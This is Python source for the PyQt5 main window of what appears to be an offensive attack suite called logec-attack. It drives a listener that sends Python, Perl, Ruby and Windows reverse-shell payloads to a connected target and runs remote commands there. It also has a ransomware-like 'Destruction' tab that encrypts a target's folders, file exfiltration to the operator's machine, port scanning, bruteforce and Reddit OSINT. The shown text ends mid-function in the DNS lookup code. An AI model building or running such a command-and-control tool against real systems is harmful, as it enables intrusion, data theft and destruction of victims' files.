#!/bin/python3

print('SUCCESS')
# import imports

import sys
from PyQt5.QtCore import Qt, QObject, QThread, pyqtSignal
from PyQt5 import QtWidgets, uic
from PyQt5.QtGui import QIcon
from PyQt5.QtWidgets import (
    QAction,
    QLabel,
    QMessageBox,
    QPushButton,
    QInputDialog,
    QTableView,
    QApplication,
    QTableWidget,
    QTableWidgetItem,
    QHeaderView,
)

# apt-get install python3-pyqt5.qtwebengine for web engine stuff
##apt-get install python3-pyqt5.qtsql
from PyQt5.QtSql import QSqlDatabase, QSqlTableModel, QSqlQuery

import threading
import os
import time
import webbrowser
import time

from agent.server import s_sock, s_action

# from server import s_sock, s_action
# from client import c_sock

## importing other UI files
from Gui.shell_popup import Ui_shell_SEND
from Gui.listen_popup import Ui_listener_popup
from Gui.Encryptor import Ui_Form as Encryptor_Popup
from Gui.portscan_popup import Ui_PortScan_Popup


### importing modules
from Modules.Linux.Reverse_Shells.reverse_shells import (
    target as rev_shell_target,
)
from Modules.Windows.Reverse_Shells.win_reverse_shells import (
    target as rev_shell_target_win,
)
from Modules.General.portscanner import Portscan

from Modules.General.bruteforce import Bruteforce

import Modules.General.utility as utility

import syspath

print(syspath.path)

# with open(".syspath","r") as f:
qtcreator_file = syspath.path + '/gui.ui'

# qtcreator_file  = "/home/kali/Documents/logec-suite/gui.ui"
Ui_MainWindow, QtBaseClass = uic.loadUiType(qtcreator_file)


class Worker(QObject):
    def run(self):
        while True:
            print('hi')
            time.sleep(1)


class MyApp(QtWidgets.QMainWindow, Ui_MainWindow):
    def __init__(self, parent=None):
        super().__init__(parent)

        QtWidgets.QMainWindow.__init__(self)
        Ui_MainWindow.__init__(self)
        self.setupUi(self)

        # self.setStyle('Windows')

        self.connected = False
        self.connected_list = []

        ## starting connections
        self.PID = os.getpid()

        self.startlist = 0
        ## A check to see if the program is on its first iteration, aka when run the first time.
        ## Handy for error messages, see the if statement in the DB section about empty queries

        ## connector
        # self.action_Target_Connect.clicked.connect(self.target_connect)

        ## do not need to defire actions as they are already in the ui file
        # self.action1 = QAction("action_Target_Connect", self)

        ## ========================================
        ## Buttons n stuff ========================
        ## ========================================

        ## Getting started
        self.GettingStarted_Readme.triggered.connect(self.getting_started)
        self.actionRead_Me_webview.triggered.connect(
            lambda: webbrowser.open(
                'https://github.com/ryanq47/logec-attack/blob/main/README.md'
            )
        )

        ## Main GUI
        self.action_Target_Listen.triggered.connect(self.listen_popup)
        # self.action_Target_Info.triggered.connect(self.target_info)

        ## button for sending commands
        self.shell_input_enter.clicked.connect(self.run_command)
        self.shell_input_enter.setShortcut('Return')

        ## PopUp for shells:
        # self.action_Target_Python_binbash.triggered.connect(self.shell_py_binbash)
        self.action_Target_Python_binbash.triggered.connect(
            self.python_shell_popup
        )
        self.action_Target_Perl_binbash.triggered.connect(
            self.perl_shell_popup
        )
        self.action_Target_Ruby_NonInteractive.triggered.connect(
            self.ruby_shell_popup
        )

        ## Windows Shells
        self.action_Target_Python_win.triggered.connect(
            self.python_shell_popup_win
        )

        ## Destruciton tab
        self.actionEncrypt_Files.triggered.connect(self.encrypt_popup)

        ## External target tab:
        self.actionPort_Scan.triggered.connect(self.portscan_popup)

        ## debug:
        self.actionDEBUG.triggered.connect(self.DEBUG)

        ## SQL

        ## c2 table
        self.table_RefreshDB_Button.clicked.connect(
            lambda: self.refresh_db('c2_db')
        )
        self.table_RefreshDB_Button.setShortcut('r')

        self.table_QueryDB_Button.clicked.connect(
            lambda: self.custom_query('c2_db')
        )
        self.table_QueryDB_Button.setShortcut('Return')

        ## main table
        self.table_RefreshDB_Button_main.clicked.connect(
            lambda: self.refresh_db('main_db')
        )
        self.table_RefreshDB_Button_main.setShortcut('r')

        self.table_QueryDB_Button_main.clicked.connect(
            lambda: self.custom_query('main_db')
        )
        self.table_QueryDB_Button_main.setShortcut('Return')

        ## OSINT Tables
        ## == Reddit Table
        self.table_RefreshDB_Button_osint_reddit.clicked.connect(
            lambda: self.refresh_db('reddit_osint_db')
        )
        self.table_RefreshDB_Button_osint_reddit.setShortcut('r')

        self.table_QueryDB_Button_osint_reddit.clicked.connect(
            lambda: self.custom_query('reddit_osint_db')
        )
        self.table_QueryDB_Button_osint_reddit.setShortcut('Return')

        ## Data Tab
        # == SQL
        self.actionHelp_Menu_DB.triggered.connect(self.help_shortcut)
        self.actionTables_DB_2.triggered.connect(self.table_shortcut)
        self.actionPortScan_DB_3.triggered.connect(self.portscan_shortcut)
        self.actionError_DB.triggered.connect(self.error_shortcut)

        ## osint
        ## == Dashboard ++
        ## connecting checkbox to each module
        ## Top Bar:
        self.dashboard_osint_keyword.textChanged.connect(
            self.osint_reddit_keyword.setText
        )

        ## Reddit
        self.dashboard_reddit_onlycomments.stateChanged.connect(
            self.osint_reddit_onlycomments.setChecked
        )
        self.dashboard_reddit_onlyprofile.stateChanged.connect(
            self.osint_reddit_onlyprofile.setChecked
        )
        self.dashboard_reddit_downloadmedia.stateChanged.connect(
            self.osint_reddit_downloadmedia.setChecked
        )
        self.dashboard_reddit_hideNSFW.stateChanged.connect(
            self.osint_reddit_hideNSFW.setChecked
        )
        self.dashboard_reddit_subreddit.textChanged.connect(
            self.osint_reddit_subreddit.setText
        )

        ## == Osint Reddit
        self.osint_reddit_search.clicked.connect(self.osint_reddit)

        ## Scanning
        ##DNS lookup
        self.scanning_dns_lookup.clicked.connect(self.dns_lookup)

        # portscan
        self.table_RefreshDB_Button_scanning_portscan.clicked.connect(
            lambda: self.refresh_db('scanning_portscan_db')
        )
        self.table_RefreshDB_Button_scanning_portscan.setShortcut('r')

        self.table_QueryDB_Button_scanning_portscan.clicked.connect(
            lambda: self.custom_query('scanning_portscan_db')
        )
        self.table_QueryDB_Button_scanning_portscan.setShortcut('Return')

        self.portscan_start.clicked.connect(self.portscan_qthread)

        ## bruteforce
        self.bruteforce_start.clicked.connect(self.bruteforce_thread)

        ## other
        ## == Perf Tab
        self.table_RefreshDB_Button_performance.clicked.connect(
            lambda: self.custom_query('performance_error_db')
        )

        ## Performance
        self.performance_speedtest.clicked.connect(
            self.performance_networkspeed
        )

        ## ========================================
        ## Init Values/Main Thread ===========================
        ## ========================================
        ## == Status Bar init
        ## sets connected to red on startup
        self.status_Connected.setStyleSheet('background-color: red')
        ## setting buttons to disabled
        self.not_connected()

        ## Object instances
        self.N = utility.Network()
        # self.P = Portscan()

        ## Portscam Inits
        self.portscan_1_1024.toggled.connect(
            lambda: self.portscan_minport.setText('1')
        )
        self.portscan_1_1024.toggled.connect(
            lambda: self.portscan_maxport.setText('1024')
        )

        self.portscan_1_10000.toggled.connect(
            lambda: self.portscan_minport.setText('1')
        )
        self.portscan_1_10000.toggled.connect(
            lambda: self.portscan_maxport.setText('10000')
        )

        self.portscan_1_65535.toggled.connect(
            lambda: self.portscan_minport.setText('1')
        )
        self.portscan_1_65535.toggled.connect(
            lambda: self.portscan_maxport.setText('65535')
        )

        """
        ## Disabling fields if clicked
        self.portscan_fast_check.stateChanged.connect(lambda: self.portscan_minport.setDisabled(True))
        self.portscan_fast_check.stateChanged.connect(lambda: self.portscan_maxport.setDisabled(True))
        self.portscan_fast_check.stateChanged.connect(lambda: self.portscan_extraport.setDisabled(True))"""

        ## == SQL init
        ## Setting DB
        self.view = self.table_SQLDB

        ## Showing help table on startup
        self.DB_Query_main.setText('!_help')
        self.custom_query('main_db')

        self.DB_Query_osint_reddit.setText('SELECT * FROM RedditResults')
        self.custom_query('reddit_osint_db')

        self.DB_Query_scanning_portscan.setText('!_portscan')
        self.custom_query('scanning_portscan_db')

        self.custom_query('performance_error_db')

        ## Starting performacne tab
        self.performance()

        ## Once loaded, setting startlist to 1
        self.startlist = self.startlist = 1

    ## ========================================
    ## Debug ==================================
    ## ========================================

    def DEBUG(self):
        self.client_connected()
        self.text_Program_Output.setText(
            'IN DEBUG MODE - NOT CONNECTED, THINGS WILL BREAK'
        )
        self.text_connections_output.setText(
            'IN DEBUG MODE - NOT CONNECTED, THINGS WILL BREAK'
        )

    ## ========================================
    ## Conn/NotConn ===========================
    ## ========================================

    def not_connected(self):
        ## Disabling stuff that needs to be disabled at startup:
        # == top buttons
        self.menu_Target_Info.setDisabled(True)
        self.menu_Target_SpawnShell.setDisabled(True)
        self.menu_Target_Destruction.setDisabled(True)
        # == CMD input
        self.shell_input.setDisabled(True)
        self.shell_input_enter.setDisabled(True)

    def client_connected(self):
        self.menu_Target_Info.setDisabled(False)
        self.menu_Target_SpawnShell.setDisabled(False)
        self.menu_Target_Destruction.setDisabled(False)

        # == CMD input
        self.shell_input.setDisabled(False)
        self.shell_input_enter.setDisabled(False)

        self.ERROR('', 'clear', '')

    ## ========================================
    ## Getting started tab ====================
    ## ========================================

    def getting_started(self):

        with open('Modules/GUI_System/gui_about', 'r') as f:
            welcome_message = f.read()
            self.text_Program_Output.setText(welcome_message)

    ## ========================================
    ## SQLDB stuff ============================
    ## ========================================

    def clear_db_table(self):
        self.view.clear()
        self.view.setRowCount(0)

    def refresh_db(self, _from):
        # removing old rows:
        self.clear_db_table()

        self.custom_query(_from)

    def custom_query(self, _from):
        ## '_from' Logic, only issue so far with this is that the top bar menu will default to the main db, can circumvent with in tab buttons
        ## To C2 db section
        if _from == 'c2_db':
            # self._from = "c2_db"
            self.view = self.table_SQLDB
            query_input = f'{self.DB_Query.text()}'

        ## To main db section
        elif _from == 'main_db':
            # self._from = "main_db"
            self.view = self.table_SQLDB_main
            query_input = f'{self.DB_Query_main.text()}'

        elif _from == 'reddit_osint_db':
            self.view = self.table_SQLDB_osint_reddit
            query_input = f'{self.DB_Query_osint_reddit.text()}'

        elif _from == 'scanning_portscan_db':
            self.view = self.scanning_portscan_db
            query_input = f'{self.DB_Query_scanning_portscan.text()}'

        elif _from == 'performance_error_db':
            self.view = self.table_SQLDB_performance_error
            query_input = 'SELECT * FROM Error'

        if query_input == '' and self.startlist != 0:
            # query_input = ""
            self.ERROR(
                'No Query Input Provided', 'Low', 'Enter an input to fix'
            )

        ## clearnig DB, and resetting from
        # _from = None
        self.clear_db_table()

        # print(query_input)
        if query_input == '!_help':
            # print("HELP")
            self.columnlist = ['Command', 'Description']
            self.view.setHorizontalHeaderLabels(
                [self.columnlist[0], self.columnlist[1]]
            )
            self.view.setColumnCount(len(self.columnlist))

            query = QSqlQuery(f'SELECT * FROM help')

            while query.next():
                rows = self.view.rowCount()
                self.view.setRowCount(rows + 1)
                self.view.setItem(
                    rows, 0, QTableWidgetItem(str(query.value(0)))
                )   # QTableWidgetItem(str(query.value(0)))
                self.view.setItem(rows, 1, QTableWidgetItem(query.value(1)))

        elif query_input == '!_tables':
            # print("TABLES")

            self.columnlist = ['Table', 'Description']
            self.view.setHorizontalHeaderLabels(
                [self.columnlist[0], self.columnlist[1]]
            )
            self.view.setColumnCount(len(self.columnlist))

            query = QSqlQuery(f'SELECT * FROM tables')

            while query.next():
                rows = self.view.rowCount()
                self.view.setRowCount(rows + 1)
                self.view.setItem(
                    rows, 0, QTableWidgetItem(str(query.value(0)))
                )   # QTableWidgetItem(str(query.value(0)))
                self.view.setItem(rows, 1, QTableWidgetItem(query.value(1)))

        elif query_input == '!_portscan':
            # print("PORTSCAN")

            self.columnlist = [
                'IP',
                'PORT(s)',
                'ScanType',
                'ScanDate',
                'ScanTime',
                'RunTime',
                'ScannerPorts',
                'Status',
            ]

            self.view.setHorizontalHeaderLabels(
                [
                    self.columnlist[0],
                    self.columnlist[1],
                    self.columnlist[2],
                    self.columnlist[3],
                    self.columnlist[4],
                    self.columnlist[5],
                    self.columnlist[6],
                    self.columnlist[7],
                ]
            )

            self.view.setColumnCount(len(self.columnlist))

            # self.view.setHorizontalHeaderLabels(["IP", "PORT(s)","ScanType", "ScanDate", "ScanTime", "RunTime"])

            query = QSqlQuery(
                f'SELECT * FROM PortScan ORDER BY ScanDate DESC, ScanTime DESC'
            )
            # print(query.value(0))

            while query.next():
                rows = self.view.rowCount()
                # print(rows)
                self.view.setRowCount(rows + 1)
                self.view.setItem(
                    rows, 0, QTableWidgetItem(query.value(0))
                )   # QTableWidgetItem(str(query.value(0)))
                self.view.setItem(rows, 1, QTableWidgetItem(query.value(1)))
                self.view.setItem(rows, 2, QTableWidgetItem(query.value(2)))
                self.view.setItem(rows, 3, QTableWidgetItem(query.value(3)))
                self.view.setItem(rows, 4, QTableWidgetItem(query.value(4)))
                self.view.setItem(rows, 5, QTableWidgetItem(query.value(5)))
                self.view.setItem(rows, 6, QTableWidgetItem(query.value(6)))
                self.view.setItem(rows, 7, QTableWidgetItem(query.value(7)))

        elif query_input == '!_error':
            # print("PORTSCAN")

            self.columnlist = [
                'ErrorName',
                'ErrorMessage',
                'Description',
                'Time',
                'Date',
            ]

            self.view.setHorizontalHeaderLabels(
                [
                    self.columnlist[0],
                    self.columnlist[1],
                    self.columnlist[2],
                    self.columnlist[3],
                    self.columnlist[4],
                ]
            )

            self.view.setColumnCount(len(self.columnlist))

            # self.view.setHorizontalHeaderLabels(["IP", "PORT(s)","ScanType", "ScanDate", "ScanTime", "RunTime"])

            query = QSqlQuery(
                f'SELECT * FROM Error ORDER BY Time DESC, Date DESC'
            )
            # print(query.value(0))

            while query.next():
                rows = self.view.rowCount()
                # print(rows)
                self.view.setRowCount(rows + 1)
                self.view.setItem(
                    rows, 0, QTableWidgetItem(query.value(0))
                )   # QTableWidgetItem(str(query.value(0)))
                self.view.setItem(rows, 1, QTableWidgetItem(query.value(1)))
                self.view.setItem(rows, 2, QTableWidgetItem(query.value(2)))
                self.view.setItem(rows, 3, QTableWidgetItem(query.value(3)))
                self.view.setItem(rows, 4, QTableWidgetItem(query.value(4)))

        else:
            # print("DEBUG: ELSE")
            query = QSqlQuery(f'{query_input}')
            # print(f"{query_input}")

            self.columnlist = ['1', '2', '3', '4', '5', '6', '7', '8']

            self.view.setHorizontalHeaderLabels(
                [
                    self.columnlist[0],
                    self.columnlist[1],
                    self.columnlist[2],
                    self.columnlist[3],
                    self.columnlist[4],
                    self.columnlist[5],
                ]
            )
            self.view.setColumnCount(len(self.columnlist))

            ## needs to be a for loop in the future. for now, multiple columns that may have empty spaces
            while query.next():
                rows = self.view.rowCount()
                self.view.setRowCount(rows + 1)
                self.view.setItem(
                    rows, 0, QTableWidgetItem(str(query.value(0)))
                )   # QTableWidgetItem(str(query.value(0)))
                self.view.setItem(rows, 1, QTableWidgetItem(query.value(1)))
                self.view.setItem(rows, 2, QTableWidgetItem(query.value(2)))
                self.view.setItem(rows, 3, QTableWidgetItem(query.value(3)))
                self.view.setItem(rows, 4, QTableWidgetItem(query.value(4)))
                self.view.setItem(rows, 5, QTableWidgetItem(query.value(5)))
                self.view.setItem(rows, 6, QTableWidgetItem(query.value(6)))

        self.view.resizeColumnsToContents()

    def help_shortcut(self):
        self.DB_Query.setText('!_help')
        self.custom_query('main_db')

    def table_shortcut(self):
        self.DB_Query.setText('!_tables')
        self.custom_query('main_db')

    def portscan_shortcut(self):
        self.DB_Query.setText('!_portscan')
        self.custom_query('main_db')

    def error_shortcut(self):
        self.DB_Query.setText('!_error')
        self.custom_query('main_db')

    ## !! NOte: Not detecitng input corrently in custom_query - not sure why.

    ## ========================================
    ## Unix Shell PopUps =======================
    ## ========================================

    ## Python Shell Unix
    def python_shell_popup(self):
        ## Inits for the popup gui
        self.window = QtWidgets.QMainWindow()
        self.shell_popup = Ui_shell_SEND()
        self.shell_popup.setupUi(self.window)
        self.window.show()

        ## popping the shell prompt & running
        self.shell_popup.popup_shell_SEND.clicked.connect(
            self.python_shell_run_thread
        )

    def python_shell_run_thread(self):
        thread = threading.Thread(target=self.python_shell_run)
        # thread = threading.Thread(target=self.listen_popup())
        thread.start()

    def python_shell_run(self):
        ip = self.shell_popup.popup_shell_IP.text()
        port = self.shell_popup.popup_shell_PORT.text()
        program = self.shell_popup.popup_shell_SHELL.text()

        ## Hiding window after send button
        self.window.hide()

        payload = rev_shell_target.pyshell(ip, port, program)

        self.text_Program_Output.setText(s_sock.send_msg(s_sock, payload))

    ## Perl Shell Unix
    def perl_shell_popup(self):
        ## Inits for the popup gui
        self.window = QtWidgets.QMainWindow()
        self.shell_popup = Ui_shell_SEND()
        self.shell_popup.setupUi(self.window)
        self.window.show()

        ## popping the shell prompt & running
        self.shell_popup.popup_shell_SEND.clicked.connect(
            self.perl_shell_run_thread
        )

    def perl_shell_run_thread(self):
        thread = threading.Thread(target=self.perl_shell_run)
        thread.start()

    def perl_shell_run(self):
        ip = self.shell_popup.popup_shell_IP.text()
        port = self.shell_popup.popup_shell_PORT.text()
        program = self.shell_popup.popup_shell_SHELL.text()

        ## Hiding window after send button
        self.window.hide()

        payload = rev_shell_target.perlshell(ip, port, program)
        self.text_Program_Output.setText(s_sock.send_msg(s_sock, payload))

    ## Ruby Shell Unix
    def ruby_shell_popup(self):
        ## Inits for the popup gui
        self.window = QtWidgets.QMainWindow()
        self.shell_popup = Ui_shell_SEND()
        self.shell_popup.setupUi(self.window)
        self.window.show()

        ## popping the shell prompt & running
        self.shell_popup.popup_shell_SEND.clicked.connect(
            self.ruby_shell_run_thread
        )

    def ruby_shell_run_thread(self):
        thread = threading.Thread(target=self.ruby_shell_run)
        thread.start()

    def ruby_shell_run(self):
        ip = self.shell_popup.popup_shell_IP.text()
        port = self.shell_popup.popup_shell_PORT.text()
        program = self.shell_popup.popup_shell_SHELL.text()

        ## Hiding window after send button
        self.window.hide()

        payload = rev_shell_target.rubyshell(ip, port, program)
        self.text_Program_Output.setText(s_sock.send_msg(s_sock, payload))

    ## ========================================
    ## Windows Shell PopUps ====================
    ## ========================================

    def python_shell_popup_win(self):
        ## Inits for the popup gui
        self.window = QtWidgets.QMainWindow()
        self.shell_popup = Ui_shell_SEND()
        self.shell_popup.setupUi(self.window)
        self.window.show()

        ## popping the shell prompt & running
        self.shell_popup.popup_shell_SEND.clicked.connect(
            self.python_shell_run_thread_win
        )

    def python_shell_run_thread_win(self):
        thread = threading.Thread(target=self.python_shell_run)
        # thread = threading.Thread(target=self.listen_popup())
        thread.start()

    def python_shell_run_win(self):
        ip = self.shell_popup.popup_shell_IP.text()
        port = self.shell_popup.popup_shell_PORT.text()
        program = self.shell_popup.popup_shell_SHELL.text()

        ## Hiding window after send button
        self.window.hide()

        payload = rev_shell_target_win.pyshell(ip, port, program)

        self.text_Program_Output.setText(s_sock.send_msg(s_sock, payload))

    ## LA Listen Shell
    def listen_popup(self):
        self.window = QtWidgets.QMainWindow()
        self.listen_popup = Ui_listener_popup()
        self.listen_popup.setupUi(self.window)
        self.window.show()

        self.listen_ip = self.listen_popup.popup_listen_ip.text()
        self.listen_port = self.listen_popup.popup_listen_port.text()

        # print(self.listen_ip, self.listen_port)

        self.listen_popup.popup_listen_LISTEN.clicked.connect(
            self.target_listen_thread
        )
        # self.window.hide()

    ## ========================================
    ## PortScan Popup ========================
    ## ========================================

    def portscan_popup(self):
        # print("POPUP")
        ## added _ to not conflict in namespace
        self.window = QtWidgets.QMainWindow()
        self._portscan_popup = Ui_PortScan_Popup()
        self._portscan_popup.setupUi(self.window)
        self.window.show()

        portscan_IP = self._portscan_popup.portscan_IP.text()

        self._portscan_popup.portscan_start.clicked.connect(
            self.portscan_qthread
        )

    def portscan_qthread(self):
        print('PORTSCNA THREAD STARTER')
        ## quick multiple IP handler
        ip_convert = str(self.portscan_IP.text()).split(',')
        valid_ip = []
        for i in ip_convert:
            i.replace(' ', '')
            valid_ip.append(i)

        ## Setting vlaues

        for input_ip in valid_ip:
            print(input_ip)
            thread = threading.Thread(target=self.portscan, args=(input_ip,))
            thread.start()

    def portscan(self, input_ip):
        print('I')

        ip = input_ip   # self._portscan_popup.portscan_IP.text()
        min_port = self.portscan_minport.text()
        max_port = self.portscan_maxport.text()
        extra_port = self.portscan_extraport.text()

        ## init vars
        standard = None
        stealth = None

        standard = (
            True
            if self.portscan_standard_check.isChecked()
            else standard == False
        )
        stealth = (
            True
            if self.portscan_stealth_check.isChecked()
            else stealth == False
        )

        if self.portscan_fast_check.isChecked():
            fast = True
            # min_port = 0
            # max_port = 0
            extra_port = '0'
        else:
            fast = False

        ## Timeout logic
        if (
            self.portscan_fast_timeout.currentText()
            == 'Light Speed (.5 Second Timeout)'
        ):
            timeout = 0.5
        elif (
            self.portscan_fast_timeout.currentText()
            == 'Ridiculous Speed (.25 Second Timeout)'
        ):
            timeout = 0.25
        elif (
            self.portscan_fast_timeout.currentText()
            == 'Ludicrous Speed (.1 Second Timeout)'
        ):
            timeout = 0.1
        elif (
            self.portscan_fast_timeout.currentText()
            == 'Plaid (.01 Second Timeout)'
        ):
            timeout = 0.01

        print(f'TIMOUT: {timeout}')

        ## if clicked standard = true
        target_list = [ip, int(min_port), int(max_port), extra_port]
        scantype_list = [
            standard,
            stealth,
            fast,
            timeout,
        ]   ## timeout shoudl always be last

        self.portscan_start.setText('-->> Scanning... <<--')

        """
        ## Starting progress Bars
        bar_thread = threading.Thread(target=self.bar_update)
        bar_thread.start()"""

        ## Re calls the object per scan/click so there is not any colusion with variables overwriting eachother
        P = Portscan()
        P.scan_framework(target_list, scantype_list)

        # portscanner.event_loop(target_list, scantype_list)
        self.portscan_start.setText('-->> Done! Scan again? <<--')
        ## Refreshing DB
        # self.DB_Query_scanning_portscan.setText("!_portscan") <<-- broken due to thread reasons
        # self.DB_Query_scanning_portscan.setText("select * from PortScan")
        # self.custom_query("scanning_portscan_db")

    """
    def bar_update(self): ## I wonder if this dosen't work due to all the threads waiting to join back up? maybe portscanner writing the value to a tmp file would have to do it, or to the DB in a .hiddentable
        while True:
            self.stealth_bar.setValue(self.P.stealth_scan_status - 1000)
            time.sleep(2)
            print(self.P.stealth_scan_status)"""
    ## ========================================
    ## Destructoin PopUps =====================
    ## ========================================

    def encrypt_popup(self):
        ## Inits for the popup gui
        self.window = QtWidgets.QMainWindow()
        self.Encryptor_Popup = Encryptor_Popup()
        self.Encryptor_Popup.setupUi(self.window)
        self.window.show()

        self.Encryptor_Popup.encryptor_EncryptButton.clicked.connect(
            self.encrypt_thread
        )

    def encrypt_thread(self):
        thread = threading.Thread(target=self.encrypt)
        thread.start()

    def encrypt(self):
        self.window.hide()

        self.encrypt_folder = self.Encryptor_Popup.encryptor_Folder.text()
        self.encrypt_extension = (
            self.Encryptor_Popup.encryptor_Extension.text()
        )
        self.encrypt_password = self.Encryptor_Popup.encryptor_Password.text()

        # print("ENCRYPTING")
        # print(self.encrypt_folder + '\n' + self.encrypt_password)

        s_action.encryptor(
            self.encrypt_folder, self.encrypt_extension, self.encrypt_password
        )
        # print("Success")
        # self.text_Program_Output.setText(f"Successful Encryption of {self.encrypt_folder}")
        ## Run encryptor with those 2 above values

    ## ========================================
    ## Server Functions =======================
    ## ========================================

    ## Error handler
    def ERROR(self, error, severity, fix):
        Date = utility.Timestamp.UTC_Date()
        Time = utility.Timestamp.UTC_Time()

        QMessageBox.critical(
            None,
            ## Title
            'Error!',
            ## Actual Error
            f'SEVERITY: {severity}\nERRMSG: {error}\nFIX: {fix}\n',
        )

        error_list = [severity, error, fix, Time, Date]

        self.db_error_write(error_list)

        """
        if severity == "high":
            self.status_ERROR.setText(f"ERROR: {error}\nFIX: {fix}")
            self.status_ERROR.setStyleSheet("background-color: red; color:black")
            
        elif severity == "medium":
            self.status_ERROR.setText(f"ERROR: {error}\nFIX: {fix}")
            self.status_ERROR.setStyleSheet("background-color: yellow; color:black")
            
        elif severity == "low":
            self.status_ERROR.setText(f"ERROR: {error}\nFIX: {fix}")
            self.status_ERROR.setStyleSheet("background-color: blue")
            
        elif severity == "clear":
            self.status_ERROR.setText("")
            self.status_ERROR.setStyleSheet("background-color: none")"""

    ## Thread for listener
    def target_listen_thread(self):
        self.window.hide()
        thread = threading.Thread(target=self.target_listen)
        # thread = threading.Thread(target=self.listen_popup())

        thread.start()

    ## Start Listener
    def target_listen(self):
        ## This is essentially a block until a connection is established, that's why its in its own thread
        ## clearning error messages
        self.ERROR('', 'clear', '')
        try:
            self.status_Connected.setStyleSheet('background-color: purple')
            self.status_Connected.setText('Connection: Listening')

            s_sock.start_server(
                s_sock,
                self.listen_popup.popup_listen_ip.text(),
                int(self.listen_popup.popup_listen_port.text()),
            )

            ## 2nd time around this does not turn green for some reason
            self.status_Connected.setStyleSheet('background-color: green')
            self.status_Connected.setText('Connection: Connected')

            self.connected = True

            ## makes it so the buttons open up, temp
            self.client_connected()

            ## On connected:

            ## getting os type (nt, posix, etc) this sets the variable of self.os_type
            self.os_info()
            ## default getting info:
            self.target_info()

        ## Listener Error handling
        except OSError as e:
            # print(f"[SYS ERROR: ADDRESS ALREADY IN USE]: \n{e}")
            self.connected = False

            # setting connected to red
            self.status_Connected.setStyleSheet('background-color: red')
            self.status_Connected.setText(f'Connection: Disconnected')

            fix = f'Kill the process listening on {self.listen_popup.popup_listen_ip.text()}:{self.listen_popup.popup_listen_port.text()}'

            self.ERROR(e, 'medium', fix)
            # self.text_Program_Output.setText()

        except ValueError as e:
            self.connected = False

            # setting connected to red
            self.status_Connected.setStyleSheet('background-color: red')
            self.status_Connected.setText(f'Connection: Disconnected')

            self.ERROR(
                e,
                'medium',
                fix='You probably put letters in the IP/PORT... try numbers. No DNS listener names at the moment',
            )

        except Exception as e:
            # print(f"SYS ERROR]: {e}")
            print(e)
            self.connected = False

            # setting connected to red
            self.status_Connected.setStyleSheet('background-color: red')
            self.status_Connected.setText(f'Connection: Disconnected')

            self.ERROR(
                e,
                'medium',
                fix='Not sure... This is the fail-safe error catcher, try a google?',
            )

        ##enabling buttons again on connection
        if self.connected:
            self.client_connected()

    ## os info:
    def os_info(self):
        self.os_type = s_sock.get_os(s_sock)

    ## ========================================
    ## Shell Functions ========================
    ## ========================================

    ## Run a command, servver side command filters
    def run_command(self):
        try:
            ## download
            if 'get' in self.shell_input.text()[:3]:
                self.data_download_thread(self.shell_input.text())

            ## target info
            elif self.shell_input.text() == 'info':
                self.target_info()

            ## send command to target
            else:
                # server.send_msg(self.shell_input.text())
                self.text_Program_Output.setText(
                    s_sock.send_msg(s_sock, self.shell_input.text())
                )
                ## Setting text back to nothing after a command
                self.shell_input.setText('')

        ## Error handling
        except BrokenPipeError as e:
            self.text_Program_Output.setText('')
            ## connected on info bar
            self.status_Connected.setStyleSheet('background-color: red')
            self.status_Connected.setText('Connection: Disconnected')
            self.shell_input.setText('')

            self.ERROR(e, 'high', fix='Client has disconnected, not sure why.')

            ## setting buttons to disabled
            self.not_connected()

    ## target info
    def target_info(self):
        os_type = (
            self.os_type
        )   ## had to use localized version of this for some reason
        try:
            hostname = s_action.c_get_hostname(str(os_type))
            ip = s_action.c_pub_ip(os_type)
            data_os = s_action.c_os(os_type)

            self.status_data_HOSTNAME.setText(hostname)
            self.status_data_IPADDR.setText(ip)
            self.status_data_OS.setText(data_os)

        ## error handling
        except Exception as e:
            print(e)
            self.ERROR(e, 'high', fix='Error getting data, not sure why')

        # self.browser_Target_Status.setText(client.host.info())

    ## ========================================
    ## Data Exfil =============================
    ## ========================================

    ## Data Upload - Not working/implemented
    def data_upload_thread(self):
        print('UPLOAD')
        pass

    def data_upload(self):
        pass

    ## Data Download

    def data_download_thread(self, msg):
        import Modules.General.filetransfer_server

        lst = []
        for i in msg.split():
            lst.append(i)
            ## ip   port    save location (not used)   Target File to download
        self.text_Program_Output.setText(
            s_sock.file_download(
                s_sock, f'0.0.0.0 5000 /home/kali/data_from_client {lst[1]}'
            )
        )

        self.shell_input.setText('')

    # def data_download(self, msg):
    # download = threading.Thread(target=self.data_download_thread, args=(msg))
    # download.start()

    ## ========================================
    ## Scanning Tab ===========================
    ## ========================================
    def dns_lookup(self):
        ## All handler
        ## Setting object instance
        self.tablewidget = self.test_table

        self.tablewidget.setRowCount(4)
        self.tablewidget.setColumnCount(1)
        self.tablewidget.setItem(0, 0, QTableWidgetItem('ns2.google.com.'))
        self.tablewidget.setItem(1, 0, QTableWidgetItem('ns3.google.com.'))

        self.tablewidget.horizontalHeader().setStretchLastSection(True)
        self.tablewidget.horizontalHeader().setSectionResizeMode(
            QHeaderView.Stretch
        )

        ## mockup to reduce code
        ## self.tablewidget = self.tablename
        ## self.tablewidget.setRowCount(len(list))
        ##self.tablewidget.setColumnCount(1)
        # for i in list:
        # self.tablewidget.setItem(row,0, QTableWidgetItem(i))
        # row = row +1
        # row = 0

        # dns_list = ["NONE","CNAME\nwww.google.com","MX\nmail.google.com","REVERSE \nexploit.tools", "TXT \ntext"]

        if self.scanning_dns_query.text() == '':
            self.ERROR(
                'No input for DNS',
                'Low',
                "Make sure the DNS field isn't empty",
            )
            dns_list = None
        else:
            dns_list = self.N.lookup_All(self.scanning_dns_query.text())
            ## One liners to save some space
            self.dns_table_formatting(
                self.dns_a_table, 'Not Found', 'A'
            ) if dns_list[0] == 'NONE' else self.dns_table_formatting(
                self.dns_a_table, dns_list[0], 'A'
            )
            self.dns_table_formatting(
                self.dns_CNAME_table, 'Not Found', 'CNAME'
            ) if dns_list[1] == 'NONE' else self.dns_table_formatting(
                self.dns_CNAME_table, dns_list[1], 'CNAME'
            )
            self.dns_table_formatting(
                self.dns_MX_table, 'Not Found', 'MX'
            ) if dns_list[2] == 'NONE' else self.dns_table_formatting(
                self.dns_MX_table, dns_list[2], 'MX'
            )
            self.dns_table_formatting(
                self.dns_Reverse_table, 'Not Found', 'Reverse Lookup'
            ) if dns_list[3] == 'NONE' else self.dns_table_formatting(
                self.dns_Reverse_table, dns_list[3], 'Reverse Lookup'
            )
            self.dns_table_formatting(
                self.dns_TXT_table, 'Not Found', 'TXT'
            ) if dns_list[4] == 'NONE' else self.dns_table_formatting(
                self.dns_TXT_table, dns_list[4], 'TXT'
            )
            self.dns_table_formatting(
                self.dns_NS_table, 'Not Found', 'NS'
